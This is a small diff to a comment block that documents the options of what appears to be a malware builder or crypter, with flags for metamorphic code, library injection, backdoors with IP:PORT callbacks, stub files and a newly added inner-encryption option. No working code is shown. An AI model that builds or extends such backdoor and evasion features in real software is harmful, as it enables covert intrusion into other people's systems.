@@ -5,6 +5,7 @@
  *
  * // --metamorph								1
  * // --compress								2
+ * // --apply-inner_encryption [ FUNCTION,FUNCTION]
  * // --inject-lib ( BACKDOOR ACTIVATE)						?
  * // --backdoor [ IP:PORT ] [ IP:PORT] [ IP:PORT ] ...
  * // --stub [ FILE ] [ FILE ] [ FILE ] ...
